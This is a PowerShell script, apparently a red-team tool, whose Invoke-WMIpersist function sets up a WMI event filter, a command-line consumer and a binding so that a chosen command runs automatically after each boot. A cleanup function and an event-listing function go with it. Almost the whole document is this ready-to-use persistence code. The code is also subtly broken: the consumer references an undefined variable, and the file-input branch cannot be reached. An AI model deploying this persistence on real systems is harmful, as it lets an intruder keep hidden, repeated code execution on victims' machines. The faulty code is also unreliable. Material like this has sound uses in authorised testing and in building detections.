<#

Invoke-WMIPersist is used to create a WMI Event subscription for persistence. 
This is designed for Powershell 2.0 as no New-CIMInstance calls are made.

Author: @bSpence7337
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
Credit for original work: 
@mattifestation PowerSploit/Persistence https://github.com/PowerShellMafia/PowerSploit/tree/master/Persistence
@Sw4mp_f0x -PowerLurker https://github.com/Sw4mpf0x/PowerLurk
Atomic-red-team https://github.com/redcanaryco/atomic-red-team

#>

#Requires -Version 2

function Invoke-WMIpersist
{
<#
.SYNOPSIS

Creates a WMI Event subscription that triggers 120 seconds after bootup.

Author: Benjamin Spence (@bSpence7337)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Create a WMI Event subscription that triggers 120 seconds after bootup.

.PARAMETER CMD

Specify the executable you want to load or the path to the file used as input

.PARAMETER Type

Specify the executable you want to load or the path to the file used as input

.PARAMETER EventName

Specify the name of the WMI event.

.EXAMPLE

Invoke-WMIpersist -Type CMD -CMD Notepad.exe -EventName NotePad4Life

#>

    Param(
        [Parameter(Mandatory=$True)]
        [string]$CMD,

        [Parameter(Mandatory=$True)]
        [ValidateScript({
            If ($_ -eq 'CMD' -Or $_ -eq 'CMDFile' ) {
                $True
            }
            Elseif ($_ -eq 'CMDFile') {
            	$CMD = [IO.File]::ReadAllText("$CMD")
            }
            else {
                Throw "$_ is not a valid -Type. Use CMD or CMDFile"
            }
        })]
        [string]$Type,

        [Parameter(Mandatory=$True)]
        [string]$EventName
    )
   
$FilterArgs = @{
				Name = $EventName
                EventNameSpace = 'root\cimv2'
                QueryLanguage = "WQL"
                Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 210"}
$Filter=Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
				Name = $EventName
                CommandLineTemplate=$CMDcontent;}
$Consumer=Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$FilterToConsumerArgs = @{
Filter = $Filter
Consumer = $Consumer
}
$FilterToConsumerBinding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs

}


function Invoke-WMICleanup
{
<#
.SYNOPSIS

Deletes a specified WMI Event subscription based on $EventName.

Author: Benjamin Spence (@bSpence7337)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Deletes a specified WMI Event subscription based on $EventName.

.PARAMETER EventName

Specify the event name you want to remove.

.EXAMPLE

Invoke-WMICleanup -EventName NotePad4Life

#>
    Param(
        [Parameter(Mandatory=$True)]
        [string]$EventName
    )

$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = '$EventName'"
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = '$EventName'"
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding"

$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject

}

function GetEvents
{
    Get-WMIObject -Namespace root\Subscription -Class __EventFilter
}